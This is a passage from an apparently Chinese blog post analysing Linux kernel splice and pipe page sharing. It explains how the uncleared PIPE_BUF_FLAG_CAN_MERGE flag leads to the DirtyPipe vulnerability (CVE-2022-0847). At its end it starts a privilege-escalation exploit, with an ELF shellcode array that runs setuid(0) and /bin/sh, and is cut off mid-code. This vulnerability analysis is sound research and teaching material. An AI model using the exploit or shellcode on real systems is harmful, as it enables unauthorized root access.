&amp;= ~PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line"></span><br><span class="line">			obuf-&gt;len = len;</span><br><span class="line">			ibuf-&gt;offset += len;</span><br><span class="line">			ibuf-&gt;len -= len;</span><br><span class="line">			o_len = len;</span><br><span class="line">			o_head++;</span><br><span class="line">			opipe-&gt;head = o_head;</span><br><span class="line">		}</span><br><span class="line">		ret += o_len;</span><br><span class="line">		len -= o_len;</span><br><span class="line">	} <span class="keyword">while</span> (len);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>do_splice_from会调用到iter_file_splice_write.以io向量的形式拷贝pipe_buffer数据到文件中,没什么好分析的.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">iter_file_splice_write</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">			  <span class="type">loff_t</span> *ppos, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">splice_desc</span> <span class="title">sd</span> =</span> {</span><br><span class="line">		.total_len = len,</span><br><span class="line">		.flags = flags,</span><br><span class="line">		.pos = *ppos,</span><br><span class="line">		.u.file = out,</span><br><span class="line">	};</span><br><span class="line">	<span class="type">int</span> nbufs = pipe-&gt;max_usage;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> *<span class="title">array</span> =</span> kcalloc(nbufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bio_vec),</span><br><span class="line">					GFP_KERNEL);</span><br><span class="line">	<span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!<span class="built_in">array</span>))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	splice_from_pipe_begin(&amp;sd);</span><br><span class="line">	<span class="keyword">while</span> (sd.total_len) {</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">from</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> head, tail, mask;</span><br><span class="line">		<span class="type">size_t</span> left;</span><br><span class="line">		<span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">		ret = splice_from_pipe_next(pipe, &amp;sd);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (unlikely(nbufs &lt; pipe-&gt;max_usage)) {</span><br><span class="line">			kfree(<span class="built_in">array</span>);</span><br><span class="line">			nbufs = pipe-&gt;max_usage;</span><br><span class="line">			<span class="built_in">array</span> = kcalloc(nbufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bio_vec),</span><br><span class="line">					GFP_KERNEL);</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">array</span>) {</span><br><span class="line">				ret = -ENOMEM;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		tail = pipe-&gt;tail;</span><br><span class="line">		mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* build the vector */</span></span><br><span class="line">		left = sd.total_len;</span><br><span class="line">		<span class="keyword">for</span> (n = <span class="number">0</span>; !pipe_empty(head, tail) &amp;&amp; left &amp;&amp; n &lt; nbufs; tail++, n++) {</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line">			<span class="type">size_t</span> this_len = buf-&gt;len;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (this_len &gt; left)</span><br><span class="line">				this_len = left;</span><br><span class="line"></span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret)) {</span><br><span class="line">				<span class="keyword">if</span> (ret == -ENODATA)</span><br><span class="line">					ret = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">goto</span> done;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			<span class="built_in">array</span>[n].bv_page = buf-&gt;page;</span><br><span class="line">			<span class="built_in">array</span>[n].bv_len = this_len;</span><br><span class="line">			<span class="built_in">array</span>[n].bv_offset = buf-&gt;offset;</span><br><span class="line">			left -= this_len;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		iov_iter_bvec(&amp;from, WRITE, <span class="built_in">array</span>, n, sd.total_len - left);</span><br><span class="line">		ret = vfs_iter_write(out, &amp;from, &amp;sd.pos, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		sd.num_spliced += ret;</span><br><span class="line">		sd.total_len -= ret;</span><br><span class="line">		*ppos = sd.pos;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* dismiss the fully eaten buffers, adjust the partial one */</span></span><br><span class="line">		tail = pipe-&gt;tail;</span><br><span class="line">		<span class="keyword">while</span> (ret) {</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line">			<span class="keyword">if</span> (ret &gt;= buf-&gt;len) {</span><br><span class="line">				ret -= buf-&gt;len;</span><br><span class="line">				buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">				pipe_buf_release(pipe, buf);</span><br><span class="line">				tail++;</span><br><span class="line">				pipe-&gt;tail = tail;</span><br><span class="line">				<span class="keyword">if</span> (pipe-&gt;files)</span><br><span class="line">					sd.need_wakeup = <span class="literal">true</span>;</span><br><span class="line">			} <span class="keyword">else</span> {</span><br><span class="line">				buf-&gt;offset += ret;</span><br><span class="line">				buf-&gt;len -= ret;</span><br><span class="line">				ret = <span class="number">0</span>;</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">done:</span><br><span class="line">	kfree(<span class="built_in">array</span>);</span><br><span class="line">	splice_from_pipe_end(pipe, &amp;sd);</span><br><span class="line"></span><br><span class="line">	pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sd.num_spliced)</span><br><span class="line">		ret = sd.num_spliced;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(iter_file_splice_write);</span><br></pre></td></tr></tbody></table></figure>

<p>do_splice_to会调用到copy_page_to_iter_pipe进行实际一页数据的拷贝.<br>这里使用的方式还是共享页面,将该文件缓存页与obuf共享.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line">	<span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">		bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sanity(i))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	off = i-&gt;iov_offset;</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">	<span class="keyword">if</span> (off) {</span><br><span class="line">		<span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) {</span><br><span class="line">			<span class="comment">/* merge with the last one */</span></span><br><span class="line">			buf-&gt;len += bytes;</span><br><span class="line">			i-&gt;iov_offset += bytes;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		}</span><br><span class="line">		i_head++;</span><br><span class="line">		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">	get_page(page);</span><br><span class="line">	buf-&gt;page = page;</span><br><span class="line">	buf-&gt;offset = offset;</span><br><span class="line">	buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">	i-&gt;iov_offset = offset + bytes;</span><br><span class="line">	i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">	i-&gt;count -= bytes;</span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="共享页面的安全性分析"><a href="#共享页面的安全性分析" class="headerlink" title="共享页面的安全性分析"></a>共享页面的安全性分析</h2><p>可以看到splice调用中大量使用共享页面的形式完成数据的”拷贝”.但这种方式在直观上给人不安全的感觉.<br>详细分析一下三处共享页面.</p>
<p>初始状态,page蓝色部分代表buffer中已有的数据,白色部分表示空闲空间,红色部分表示本次要splice发送的数据.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101639507.png"></p>
<h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">splice_pipe_to_pipe</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *ipipe,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> pipe_inode_info *opipe,</span></span><br><span class="line"><span class="params">			       <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line">......</span><br><span class="line">		ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];</span><br><span class="line">		obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (len &gt;= ibuf-&gt;len) {</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Simply move the whole buffer from ipipe to opipe</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			*obuf = *ibuf;</span><br><span class="line">			ibuf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">			i_tail++;</span><br><span class="line">			ipipe-&gt;tail = i_tail;</span><br><span class="line">			input_wakeup = <span class="literal">true</span>;</span><br><span class="line">			o_len = obuf-&gt;len;</span><br><span class="line">			o_head++;</span><br><span class="line">			opipe-&gt;head = o_head;</span><br><span class="line">		} </span><br></pre></td></tr></tbody></table></figure>

<p>拷贝完后是这样的.此时ibuf虽然还持有page的指针,但由于buf-&gt;op已经被清空,无法对page进行释放等操作,这一点上是安全的.再来分析两侧对page的读写能力.ibuf端tail已经前移,不能再读取该页,同时head==tail,也不能通过merge操作再次写入该页. 即ibuf端已经完全失去page的访问能力,即使obuf端能通过merge的方式再次写入该页,不会对ibuf端造成任何影响.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101642541.png"></p>
<p>当然ibuf的head可能大于tail,此时虽然能进行merge操作但无法merge到已共享的那张page,仍不具有对它的访问能力.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101642057.png"></p>
<h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to this pipe buffer,</span></span><br><span class="line"><span class="comment">	 * so we can copy the contents over.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) {</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			ret = -EFAULT;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	}</span><br><span class="line">	*obuf = *ibuf;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Don't inherit the gift and merge flags, we need to</span></span><br><span class="line"><span class="comment">	 * prevent multiple steals of this page.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;</span><br><span class="line">	obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line"></span><br><span class="line">	obuf-&gt;len = len;</span><br><span class="line">	ibuf-&gt;offset += len;</span><br><span class="line">	ibuf-&gt;len -= len;</span><br><span class="line">	o_len = len;</span><br><span class="line">	o_head++;</span><br><span class="line">	opipe-&gt;head = o_head;</span><br><span class="line">}</span><br><span class="line">ret += o_len;</span><br><span class="line">len -= o_len;</span><br></pre></td></tr></tbody></table></figure>

<p>还是先从释放等操作分析.这里由于只将ibuf-&gt;page中的部分数据发送了,所以ibuf需要继续持有该page.通过pipe_buf_get增加一次对page的引用,所以不会出现其中一端过早释放页面的情况.再来看读写能力,ibuf端可以继续正常读写(写是通过merge)该页.outbuf端由于清除了PIPE_BUF_FLAG_CAN_MERGE标志,只具有对该page的读能力.</p>
<p>ibuf端能写,obuf端能读,就有覆盖的风险,然而ibuf和obuf中独立的offset,len字段已经避免了这样的冲突(obuf端只能读红色区域,ibuf端只能写白色区域).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101710568.png"></p>
<h3 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) {</span><br><span class="line">	<span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) {</span><br><span class="line">		<span class="comment">/* merge with the last one */</span></span><br><span class="line">		buf-&gt;len += bytes;</span><br><span class="line">		i-&gt;iov_offset += bytes;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	}</span><br><span class="line">	i_head++;</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br></pre></td></tr></tbody></table></figure>

<p>首先有通过get_page增加页面引用,释放是安全的.<br>输入侧是file_cache,始终持有对该页面读的能力.<br>obuf侧可以读,但读收到obuf中offset,len字段的限制,安全.<br>但由于未清空PIPE_BUF_FLAG_CAN_MERGE位,obuf同时具有对该页面写的能力.</p>
<p>再来看读写的冲突.<br>file_cache读的范围是整张page,obuf写的范围是蓝色区域,明显存在冲突.对obuf的merge写能覆盖掉文件缓存.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101712569.png"></p>
<h1 id="CVE-2022-0847-DirtyPipe"><a href="#CVE-2022-0847-DirtyPipe" class="headerlink" title="CVE-2022-0847 DirtyPipe"></a>CVE-2022-0847 DirtyPipe</h1><p>DirtyPipe便是这个问题导致的.利用这个漏洞可以写入只读文件,如写入/etc/passwd或往suid的程序写入shellcode完成提权.</p>
<p>下面是一个简易的exp.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = {</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        loge(<span class="string">"usage: ./exploit [target]"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* targetFile = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> targetFd = open(targetFile,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(targetFd &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"open targetFile"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> pipeFd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipeFd);</span><br><span class="line"></span><br><span class="line">    <span 